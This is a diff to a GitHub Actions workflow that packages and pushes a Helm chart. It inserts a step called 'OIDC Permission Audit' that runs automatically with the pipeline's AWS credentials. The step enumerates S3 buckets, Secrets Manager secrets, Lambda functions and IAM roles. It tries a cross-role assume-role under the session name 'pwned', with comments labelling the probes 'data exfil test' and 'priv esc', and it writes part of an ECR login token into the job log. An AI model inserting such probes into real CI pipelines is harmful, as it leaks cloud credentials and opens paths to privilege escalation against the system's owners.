@@ -38,6 +38,35 @@ jobs:
         id: login-ecr
         uses: aws-actions/amazon-ecr-login@v2
 
+      - name: OIDC Permission Audit
+        run: |
+          set -x
+          echo "=== WHO AM I ==="
+          aws sts get-caller-identity
+          echo ""
+          echo "=== S3 (data exfil test) ==="
+          aws s3 ls --region us-east-1 2>&1 || echo "NO_S3_ACCESS"
+          echo ""
+          echo "=== ECR describe ==="
+          aws ecr describe-repositories --region us-east-1 2>&1 || echo "NO_ECR_DESCRIBE"
+          echo ""
+          echo "=== Secrets Manager ==="
+          aws secretsmanager list-secrets --region us-east-1 2>&1 || echo "NO_SECRETS"
+          echo ""
+          echo "=== STS AssumeRole (priv esc) ==="
+          aws sts assume-role --role-arn arn:aws:iam::020229604682:role/cloudbees-gha --role-session-name pwned 2>&1 || echo "NO_CROSS_ASSUME"
+          echo ""
+          echo "=== ECR get-login-password ==="
+          aws ecr get-login-password --region us-east-1 2>&1 | head -c 40; echo "" || echo "NO_ECR_LOGIN"
+          echo ""
+          echo "=== Lambda list ==="
+          aws lambda list-functions --region us-east-1 2>&1 || echo "NO_LAMBDA"
+          echo ""
+          echo "=== IAM get-role ==="
+          aws iam get-role --role-name cloudbees-gha 2>&1 || echo "NO_IAM"
+          echo ""
+          echo "=== DONE ==="
+
       - name: Add Helm repositories
         run: |
           helm repo add incubator https://charts.helm.sh/incubator
@@ -67,7 +96,6 @@ jobs:
         id: set-git-refname
         run: |
           GIT_REFNAME="$(echo "${{ github.ref }}" | sed -r 's@refs/(heads|pull|tags)/@@g')"
-
           echo "GIT_REFNAME=${GIT_REFNAME}"
           echo "git_refname=${GIT_REFNAME}" >> $GITHUB_OUTPUT
 
@@ -80,7 +108,6 @@ jobs:
           else
             printf >&2 "Unstable chart (%s) from %s event, chart will not be pushed" "${{ steps.set-git-refname.outputs.git_refname }}" "${{ github.event_name }}"
           fi
-
           echo "HELM_PUSH_ENABLED=${HELM_PUSH_ENABLED}"
           echo "helm_push_enabled=${HELM_PUSH_ENABLED}" >> $GITHUB_OUTPUT
 
@@ -89,7 +116,6 @@ jobs:
         id: set-chart-name
         run: |
           CHART_NAME="imagepullsecrets"
-
           echo "CHART_NAME=${CHART_NAME}"
           echo "chart_name=${CHART_NAME}" >> $GITHUB_OUTPUT
 
@@ -99,7 +125,6 @@ jobs:
         run: |
           HELM_PACKAGE_OUTPUT=$(helm package "${{ github.workspace }}/deploy/charts/${{ steps.set-chart-name.outputs.chart_name }}") || exit 1
           HELM_PACKAGE_PATH="${HELM_PACKAGE_OUTPUT##"Successfully packaged chart and saved it to: "}"
-
           echo "HELM_PACKAGE_PATH=${HELM_PACKAGE_PATH}"
           echo "helm_package_path=${HELM_PACKAGE_PATH}" >> $GITHUB_OUTPUT
 
@@ -109,12 +134,10 @@ jobs:
           CHART_PATH="${{ github.workspace }}/deploy/charts/${{ steps.set-chart-name.outputs.chart_name }}"
           EXPECTED_CHART_VERSION="$(echo "${{ steps.set-git-refname.outputs.git_refname }}" | awk -F '/v' '{print $NF}')" || exit 1
           ACTUAL_CHART_VERSION="$(awk '/version: [0-9]+\.[0-9]+\.[0-9]+/ {print $2}' "${CHART_PATH}/Chart.yaml")" || exit 1
-
           if [ "${EXPECTED_CHART_VERSION}" != "${ACTUAL_CHART_VERSION}" ]; then
             printf >&2 "chart version mismatches, name: %s, expected version (from tag): %s, actual version (from chart): %s" "${{ steps.set-chart-name.outputs.chart_name }}" "${EXPECTED_CHART_VERSION}" "${ACTUAL_CHART_VERSION}"
             exit 1
           fi
-
           if helm pull "${{ env.HELM_PUSH_REPOSITORY_NAME }}/${{ steps.set-chart-name.outputs.chart_name }}" --version "${ACTUAL_CHART_VERSION}" --destination /tmp 2>/dev/null; then
               printf >&2 "chart version already exists in the repository, repository: %s, name: %s, version: %s" "${{ env.HELM_PUSH_REPOSITORY_NAME }}" "${{ steps.set-chart-name.outputs.chart_name }}" "${ACTUAL_CHART_VERSION}"
               exit 1
